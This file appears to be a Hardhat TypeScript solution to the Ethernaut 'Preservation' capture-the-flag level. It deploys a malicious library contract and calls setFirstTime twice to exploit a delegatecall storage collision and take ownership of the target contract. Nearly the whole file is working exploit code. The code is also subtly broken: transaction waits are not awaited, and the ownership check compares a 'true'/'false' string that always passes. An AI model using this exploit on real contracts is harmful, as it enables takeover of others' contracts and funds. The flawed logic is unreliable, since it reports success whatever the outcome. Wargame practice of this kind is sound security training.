import { ethers } from "hardhat";

async function attackPreservation() {
    // change contract addresses here.
    const preservationAddress = "0x75597d353C2001D18560B9ac5154CCED2Be58212";
    const player = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954"; //place your player address here (you may type player in ethernaut console)
    const attackLibraryAddress = "0x465e72a7d852689fd69ff17255ec8455fe29bdb8";
    const args: any[] = [];
    const deployer = process.env.PRIVATE_KEY || "";
    // [deployer] = await ethers.getSigners();

    // Don't touch below 🚀
    // Vulnerability comes from the possibility of making a malicious contract the library
    // Additional read:
    // site here

    // deploying attack contract here
    // const deployed = await deployContract(hre, "AttackLibraryContract", args);
    // alternative below
    console.log("Deploying attack contract AttackLibraryContract...");
    const Factory = await ethers.getContractFactory("AttackLibraryContract", deployer);
    const attackLibraryContract = await Factory.deploy();
    console.log(attackLibraryContract);
    console.log(`Contract deployed to ${attackLibraryContract.address}`);
    console.log("Attack contract deployed...");
    // experimantal verify below
    // if (attackLibraryContract.address){
    //     console.log("Verifying contract...");
    //     try {
    //         await run("verify:verify", {
    //             address: eternalKing.address,
    //             constructorArguments: args,
    //         });
    //     } catch (e: any) {
    //         if (e.message.toLowerCase().includes("already verified")) {
    //             console.log("Already verified!");
    //         } else {
    //             console.log(e);
    //         }
    //     }
    // }

    // no change here. attack starts here.
    const attackPreservation = await ethers.getContractAt("Preservation", preservationAddress);
    const oldOwner = await attackPreservation.owner();
    console.log(`Current owner is: ${oldOwner}`);
    console.log("Changing library to Players own contract...");
    const tx1 = await attackPreservation.setFirstTime(attackLibraryContract.address);
    tx1.wait(1);
    console.log("Change library done!now setting new owner via vulnerability...");
    const tx2 = await attackPreservation.setFirstTime(1);
    const tx2Receipt = tx2.wait(1);
    console.log(tx2Receipt);
    const newOwner = ((await attackPreservation.owner()) === player).toString();
    console.log(`Passed this level: ${newOwner}`);
    if (newOwner) {
        console.log("You may now submit to ethernaut");
    } else {
        console.log("Player is not the owner, review code above and try again...");
    }
}

attackPreservation()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
